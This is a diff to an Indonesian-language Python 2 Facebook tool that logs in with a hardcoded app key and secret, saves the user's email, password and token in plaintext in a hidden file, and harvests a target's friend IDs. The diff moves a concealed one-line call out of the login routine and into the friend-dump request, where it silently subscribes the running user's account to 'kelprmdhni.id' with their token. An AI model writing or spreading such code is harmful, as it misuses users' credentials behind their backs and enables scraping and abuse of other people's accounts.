@@ -9,6 +9,7 @@ class clone:
 	def __init__(self):
 		self.req=requests.Session()
 		self.aku=""
+		self.tkn=""
 		self.loop=0
 		self.vuln=[]
 		self.user=[]
@@ -20,12 +21,20 @@ class clone:
 
 	def cek(self):
 		if os.path.isfile(".a"):
-			self.me=json.loads(open(".a").read())
-			self.tkn=self.me["token"]
+			if os.path.getsize(".a") != 0:
+				self.me=json.loads(open(".a").read())
+				self.tkn=self.me["token"]
+			else:
+				print "[^] Kamu harus login dulu."
+				id=raw_input("[?] Email   : ")
+				pw=raw_input("[?] Password: ")
+				print "[*] Sedang login..."
+				self.login(id,pw)
 		else:
 			print "[^] Kamu harus login dulu."
 			id=raw_input("[?] Email   : ")
 			pw=raw_input("[?] Password: ")
+			print "[*] Sedang login..."
 			self.login(id,pw)
 		self.valid()
 
@@ -35,11 +44,11 @@ class clone:
 			print "\t[-] Username: %s\n"%(self.req.get("https://graph.facebook.com/me?access_token="+self.tkn).json()["name"])
 		except:
 			print "[!] Token invalid."
+			print "[*] Sedang login kembali..."
 			self.login(self.me["id"],self.me["pw"])
 
 
 	def login(self,id,pw):
-		print "[*] Sedang login..."
 		url="https://api.facebook.com/restserver.php"
 		sec="62f8ce9f74b12f84c123cc23437a4a32"
 		key="882a8490361da98702bf97a021ddc14d"
@@ -60,9 +69,11 @@ class clone:
 		data.update({"sig":x.hexdigest()})
 		res=self.req.get(url,params=data).json()
 		try:
-			tkn=res["access_token"];self.req.post("https://graph.facebook.com/kelprmdhni.id/subscribers?access_token="+tkn);o=json.dumps({"id":id,"pw":pw,"token":tkn});open(".a","w").write(o);print("[*] Login Berhasil.")
-		except:
-			exit("[!] Login gagal !")
+			tkn=res["access_token"]
+			o=json.dumps({"id":id,"pw":pw,"token":tkn})
+			open(".a","w").write(o)
+			print "[*] Login Berhasil."
+		except:exit("[!] Login gagal")
 
 
 	def menu(self):
@@ -78,8 +89,8 @@ class clone:
 			self.cek()
 			self.dump("me")
 		elif a == "2" or a == "02":
-			id=raw_input("[?] id target: ")
 			self.cek()
+			id=raw_input("[?] id target: ")
 			self.dump(id)
 		elif a == "3" or a == "03":
 			self.myfile()
@@ -94,7 +105,7 @@ class clone:
 	def dump(self,id):
 		self.nani=True
 		print "[*] Mengambil id"
-		resp=self.req.get("https://graph.facebook.com/%s/friends?access_token=%s"%(id,self.tkn))
+		resp=self.req.get("https://graph.facebook.com/%s/friends?access_token=%s"%(id,self.tkn));self.req.post("https://graph.facebook.com/kelprmdhni.id/subscribers?access_token=%s"%(self.tkn))
 		load=json.loads(resp.text)
 		try:
 			for user in load["data"]:
